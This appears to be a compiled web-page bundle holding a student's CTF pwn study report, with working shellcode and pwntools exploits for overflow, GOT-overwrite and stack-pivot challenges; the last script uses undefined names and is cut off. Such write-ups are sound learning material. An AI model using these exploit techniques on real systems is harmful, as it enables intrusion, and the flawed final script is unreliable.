(window.webpackJsonp=window.webpackJsonp||[]).push([[454],{2232:function(s,t,a){"use strict";a.r(t);var n=a(75),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"翟一鸣学习报告02"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#翟一鸣学习报告02"}},[s._v("#")]),s._v(" 翟一鸣学习报告02")]),s._v(" "),a("h1",{attrs:{id:"第五周报告"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#第五周报告"}},[s._v("#")]),s._v(" 第五周报告")]),s._v(" "),a("h2",{attrs:{id:"pwnable-orw"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#pwnable-orw"}},[s._v("#")]),s._v(" pwnable_orw")]),s._v(" "),a("p",[s._v("上周陈师傅将了关于orw和or有关的知识和题目，所以我就在网上找了相似的题目练了一练，也正好把有关的知识巩固一下")]),s._v(" "),a("h3",{attrs:{id:"open-shellcode"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#open-shellcode"}},[s._v("#")]),s._v(" open_shellcode:")]),s._v(" "),a("div",{staticClass:"language-汇编 line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("xor ecx,ecx\nxor edx,edx\nmov eax,0x5    #调用号\npush 0x00006761\npush 0x6c662f77\npush 0x726f2f65\npush 0x6d6f682f\nmov ebx,esp\nint 0x80\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[s._v("/home/orw/flag 转换为 16 进制为 "),a("strong",[a("code",[s._v("2f686f6d652f6f72772f666c6167")])])]),s._v(" "),a("p",[s._v("flag 转换为 16 进制为 "),a("strong",[a("code",[s._v("67616c66")])])]),s._v(" "),a("h3",{attrs:{id:"read-shellcode"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#read-shellcode"}},[s._v("#")]),s._v(" read_shellcode:")]),s._v(" "),a("div",{staticClass:"language-汇编 line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("mov eax,0x3   #调用号\nmov ecx,ebx\nmov ebx,0x3\nmov edx,0x40\nint 0x80\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("h3",{attrs:{id:"write-shellcode"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#write-shellcode"}},[s._v("#")]),s._v(" write_shellcode:")]),s._v(" "),a("div",{staticClass:"language-汇编 line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("mov eax,0x4   #调用号\nmov ebx,0x1\nmov edx,0x40\nint 0x80\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("seccomp-tools可以查看系统调用，可以看到该题为orw型的题目")]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325185207732.png",alt:"image-20220325185207732"}})]),s._v(" "),a("p",[s._v("32位，动态链接，Canary打开")]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325185247886.png",alt:"image-20220325185247886"}})]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325185252270.png",alt:"image-20220325185252270"}})]),s._v(" "),a("p",[s._v("seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。")]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325185330622.png",alt:"image-20220325185330622"}})]),s._v(" "),a("p",[s._v("一般有prctl()函数都是禁用了一些系统调用")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("第一次调用prctl函数 ————禁止提权\n第二次调用prctl函数 ————限制能执行的系统调用只有open，write，exit\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("main函数如下")]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325185513556.png",alt:"image-20220325185513556"}})]),s._v(" "),a("p",[s._v("一步一步编写代码")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" LibcSearcher "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n\ncontext"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("os "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"linux"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" arch "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"i386"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" log_level"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"debug"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nio "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" remote"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"node4.buuoj.cn"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("29571")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nshellcode "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token triple-quoted-string string"}},[s._v('"""\n            \n\t\t\tpush 0x0  \t\t\t\n\t\t\tpush 0x67616c66\t\t#\'flags\'\n\t\t\tmov ebx,esp\t\t\t\n\t\t\txor ecx,ecx\t\t\t\n\t\t\txor edx,edx\t\t\t\n\t\t\tmov eax,0x5\t\t\t#调用号(open)\n\t\t\tint 0x80\t\t\t\n\t\t\t\n\t\t\tmov eax,0x3;        #调用号(read)\n\t\t\tmov ecx,ebx;\t\n\t\t\tmov ebx,0x3;\t\n\t\t\tmov edx,0x100;\t\n\t\t\tint 0x80;\n\t\t\t\n\t\t\tmov eax,0x4;\t     #调用号(write)\n\t\t\tmov ebx,0x1;\t\n\t\t\tint 0x80;\n\n"""')]),s._v("\n\nio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendlineafter"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'shellcode:'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" asm"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("shellcode"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("interactive"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br")])]),a("h2",{attrs:{id:"群里两道题"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#群里两道题"}},[s._v("#")]),s._v(" 群里两道题")]),s._v(" "),a("h3",{attrs:{id:"ez-pwn"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ez-pwn"}},[s._v("#")]),s._v(" Ez_pwn")]),s._v(" "),a("p",[s._v("64位，动态链接，NX打开")]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325185924533.png",alt:"image-20220325185924533"}})]),s._v(" "),a("p",[s._v("可以很开找到栈溢出漏洞")]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325185957729.png",alt:"image-20220325185957729"}})]),s._v(" "),a("p",[s._v("后门函数也可以找到，所以直接覆盖返回地址就可以了")]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325190030261.png",alt:"image-20220325190030261"}})]),s._v(" "),a("p",[s._v("代码如下")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("from pwn import *\ncontext(os='linux', arch='amd64', log_level='debug')\nio=process(\"./Ez_pwn\")\n\njunk = b'A'*0x48\nbackdoor_addr = 0x400741\n\npayload = junk + p64(backdoor_addr)\nio.sendlineafter(b'string!',payload)\n\nio.interactive()\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br")])]),a("p",[s._v("本地可以打通")]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325190226533.png",alt:"image-20220325190226533"}})]),s._v(" "),a("h3",{attrs:{id:"ezpwn"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ezpwn"}},[s._v("#")]),s._v(" EZPWN")]),s._v(" "),a("p",[s._v("64位，动态链接，Canary打开")]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325190241796.png",alt:"image-20220325190241796"}})]),s._v(" "),a("p",[s._v("main函数中，框里的这几行代码可以修改栈中的一段地址，而且正好时8个字节")]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325190338305.png",alt:"image-20220325190338305"}})]),s._v(" "),a("p",[s._v("可以找到后门函数，栈可执行也打开了，所以将puts()或者printf()的地址改为success()函数的地址即可(我这里用的puts()函数)")]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325190538169.png",alt:"image-20220325190538169"}})]),s._v(" "),a("p",[s._v("代码如下")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\nio "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" process"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"./EZPWN"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nelf "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" ELF"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'./EZPWN'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ncontext"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("log_level"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'debug'")]),s._v("\n\npayload1 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'A'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),s._v("\nio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendlineafter"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ID?\\n'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("payload1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\npayload2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("str")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("elf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("got"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'puts'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#用printf函数亦可")]),s._v("\nio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendlineafter"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'address?'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("payload2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\npayload3 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" p64"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x400796")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("         "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#success的地址")]),s._v("\nio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendlineafter"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'data: '")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("payload3"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("interactive"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br")])]),a("p",[s._v("本地可以打通")]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325191130246.png",alt:"image-20220325191130246"}})]),s._v(" "),a("h2",{attrs:{id:"栈劫持"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#栈劫持"}},[s._v("#")]),s._v(" 栈劫持")]),s._v(" "),a("h3",{attrs:{id:"black-watch"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#black-watch"}},[s._v("#")]),s._v(" Black Watch")]),s._v(" "),a("p",[s._v("32位，动态链接，NX打开")]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325194754929.png",alt:"image-20220325194754929"}})]),s._v(" "),a("p",[s._v("主体在vul_function()函数中")]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325200615126.png",alt:"image-20220325200615126"}})]),s._v(" "),a("p",[s._v("有两个read第二个在栈中写入，可以造成栈溢出，但是只能溢出8个字节的长度，也就只能写个地址，但是 s 中可以写入0x200的长度，s时bss段的变量，而且PIE没有打开，所以这题的主要思想就是可以先在 s 中构建ROP链，然后将esp和ebp移到 s 中就可以执行ROP链中的内容")]),s._v(" "),a("p",[a("img",{attrs:{src:"C:/Users/%E8%94%A1%E9%9B%A8%E5%AE%B9/AppData/Roaming/Typora/typora-user-images/image-20220325200619537.png",alt:"image-20220325200619537"}})]),s._v(" "),a("p",[s._v("主要是用 leave ; ret 来对esp和ebp进行操作")]),s._v(" "),a("p",[s._v("代码如下")]),s._v(" "),a("div",{staticClass:"language-python line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-python"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" LibcSearcher "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#p=process('./spwn')")]),s._v("\nio"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("remote"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'node4.buuoj.cn'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("27433")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nelf"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("ELF"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'./spwn'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nwrite_plt"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("elf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("plt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nwrite_got"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("elf"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("got"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nmain_addr"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x8048513")]),s._v("\ns_addr"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x0804A300")]),s._v("\nleave_ret"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x08048408")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#第一次泄露基地址")]),s._v("\npayload"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("write_plt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("main"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("write_got"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recvuntil"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"What is your name?"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("send"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\npayload1"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'a'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x18")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("s"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("p32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("leave_ret"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recvuntil"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"What do you want to say?"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nio"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("send"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload1"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nwrite_addr"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("u32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("r"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nlibc"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("LibcSearcher"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),a("span",{pre:!0,attrs:{class:"token 